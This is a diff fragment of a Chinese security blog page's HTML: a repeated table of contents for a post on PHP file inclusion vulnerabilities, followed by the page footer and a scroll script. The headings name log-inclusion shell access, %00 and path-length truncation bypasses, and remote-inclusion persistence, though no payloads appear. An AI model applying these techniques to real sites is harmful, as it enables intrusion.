+<li><a href="#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%8B%BFshell-5">包含日志拿shell</a>
+<ul>
+<li><a href="#%E6%8B%BFshell%E6%AD%A5%E9%AA%A4-5">拿shell步骤</a></li>
+<li><a href="#%E5%AE%9E%E5%88%97-5">实列</a></li>
+</ul>
+</li>
+<li><a href="#%E8%AF%BB%E6%BA%90%E4%BB%A3%E7%A0%81-5">读源代码</a></li>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-5">远程文件包含</a>
+<ul>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E5%90%8E%E7%BC%80%E5%90%8D%E9%99%90%E5%88%B6-5">远程包含限制绕过后缀名限制</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-5">利用远程文件包含进行权限维持</a></li>
+</ul>
+</li>
+<li><a href="#php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-6">php文件包含漏洞</a></li>
+<li><a href="#%E5%B8%B8%E8%A7%81%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0-6">常见包含函数</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-6">利用条件</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-6">文件包含</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-6">利用方法</a></li>
+<li><a href="#%E5%AE%9E%E4%BE%8B-6">实例</a></li>
+<li><a href="#%E9%99%84%E5%8A%A0%E5%90%8E%E7%BC%80%E6%88%AA%E6%96%AD-6">附加后缀截断</a>
+<ul>
+<li><a href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%B8%8000%E6%88%AA%E6%96%AD-6">绕过方法一：%00截断</a></li>
+<li><a href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%BA%8C%E6%96%87%E4%BB%B6%E5%90%8D%E9%99%84%E5%8A%A0%E8%BF%9B%E8%A1%8C%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD-6">绕过方法二：文件名附加./././././.进行长度截断</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%8B%BFshell-6">包含日志拿shell</a>
+<ul>
+<li><a href="#%E6%8B%BFshell%E6%AD%A5%E9%AA%A4-6">拿shell步骤</a></li>
+<li><a href="#%E5%AE%9E%E5%88%97-6">实列</a></li>
+</ul>
+</li>
+<li><a href="#%E8%AF%BB%E6%BA%90%E4%BB%A3%E7%A0%81-6">读源代码</a></li>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-6">远程文件包含</a>
+<ul>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E5%90%8E%E7%BC%80%E5%90%8D%E9%99%90%E5%88%B6-6">远程包含限制绕过后缀名限制</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-6">利用远程文件包含进行权限维持</a></li>
+</ul>
+</li>
+<li><a href="#php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-7">php文件包含漏洞</a></li>
+<li><a href="#%E5%B8%B8%E8%A7%81%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0-7">常见包含函数</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-7">利用条件</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-7">文件包含</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-7">利用方法</a></li>
+<li><a href="#%E5%AE%9E%E4%BE%8B-7">实例</a></li>
+<li><a href="#%E9%99%84%E5%8A%A0%E5%90%8E%E7%BC%80%E6%88%AA%E6%96%AD-7">附加后缀截断</a>
+<ul>
+<li><a href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%B8%8000%E6%88%AA%E6%96%AD-7">绕过方法一：%00截断</a></li>
+<li><a href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%BA%8C%E6%96%87%E4%BB%B6%E5%90%8D%E9%99%84%E5%8A%A0%E8%BF%9B%E8%A1%8C%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD-7">绕过方法二：文件名附加./././././.进行长度截断</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%8B%BFshell-7">包含日志拿shell</a>
+<ul>
+<li><a href="#%E6%8B%BFshell%E6%AD%A5%E9%AA%A4-7">拿shell步骤</a></li>
+<li><a href="#%E5%AE%9E%E5%88%97-7">实列</a></li>
+</ul>
+</li>
+<li><a href="#%E8%AF%BB%E6%BA%90%E4%BB%A3%E7%A0%81-7">读源代码</a></li>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-7">远程文件包含</a>
+<ul>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E5%90%8E%E7%BC%80%E5%90%8D%E9%99%90%E5%88%B6-7">远程包含限制绕过后缀名限制</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-7">利用远程文件包含进行权限维持</a></li>
+</ul>
+</li>
+<li><a href="#php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-8">php文件包含漏洞</a></li>
+<li><a href="#%E5%B8%B8%E8%A7%81%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0-8">常见包含函数</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-8">利用条件</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-8">文件包含</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-8">利用方法</a></li>
+<li><a href="#%E5%AE%9E%E4%BE%8B-8">实例</a></li>
+<li><a href="#%E9%99%84%E5%8A%A0%E5%90%8E%E7%BC%80%E6%88%AA%E6%96%AD-8">附加后缀截断</a>
+<ul>
+<li><a href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%B8%8000%E6%88%AA%E6%96%AD-8">绕过方法一：%00截断</a></li>
+<li><a href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%BA%8C%E6%96%87%E4%BB%B6%E5%90%8D%E9%99%84%E5%8A%A0%E8%BF%9B%E8%A1%8C%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD-8">绕过方法二：文件名附加./././././.进行长度截断</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%8B%BFshell-8">包含日志拿shell</a>
+<ul>
+<li><a href="#%E6%8B%BFshell%E6%AD%A5%E9%AA%A4-8">拿shell步骤</a></li>
+<li><a href="#%E5%AE%9E%E5%88%97-8">实列</a></li>
+</ul>
+</li>
+<li><a href="#%E8%AF%BB%E6%BA%90%E4%BB%A3%E7%A0%81-8">读源代码</a></li>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-8">远程文件包含</a>
+<ul>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E5%90%8E%E7%BC%80%E5%90%8D%E9%99%90%E5%88%B6-8">远程包含限制绕过后缀名限制</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-8">利用远程文件包含进行权限维持</a></li>
+</ul>
+</li>
+<li><a href="#php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-9">php文件包含漏洞</a></li>
+<li><a href="#%E5%B8%B8%E8%A7%81%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0-9">常见包含函数</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-9">利用条件</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-9">文件包含</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-9">利用方法</a></li>
+<li><a href="#%E5%AE%9E%E4%BE%8B-9">实例</a></li>
+<li><a href="#%E9%99%84%E5%8A%A0%E5%90%8E%E7%BC%80%E6%88%AA%E6%96%AD-9">附加后缀截断</a>
+<ul>
+<li><a href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%B8%8000%E6%88%AA%E6%96%AD-9">绕过方法一：%00截断</a></li>
+<li><a href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%BA%8C%E6%96%87%E4%BB%B6%E5%90%8D%E9%99%84%E5%8A%A0%E8%BF%9B%E8%A1%8C%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD-9">绕过方法二：文件名附加./././././.进行长度截断</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%8B%BFshell-9">包含日志拿shell</a>
+<ul>
+<li><a href="#%E6%8B%BFshell%E6%AD%A5%E9%AA%A4-9">拿shell步骤</a></li>
+<li><a href="#%E5%AE%9E%E5%88%97-9">实列</a></li>
+</ul>
+</li>
+<li><a href="#%E8%AF%BB%E6%BA%90%E4%BB%A3%E7%A0%81-9">读源代码</a></li>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-9">远程文件包含</a>
+<ul>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E5%90%8E%E7%BC%80%E5%90%8D%E9%99%90%E5%88%B6-9">远程包含限制绕过后缀名限制</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-9">利用远程文件包含进行权限维持</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://piaogexu.github.io/post/lou-dong-shu-li-pian-zhi-php-fan-xu-lie-hua-lou-dong/">
+              <h3 class="post-title">
+                漏洞梳理篇之php反序列化漏洞
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://piaogexu.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
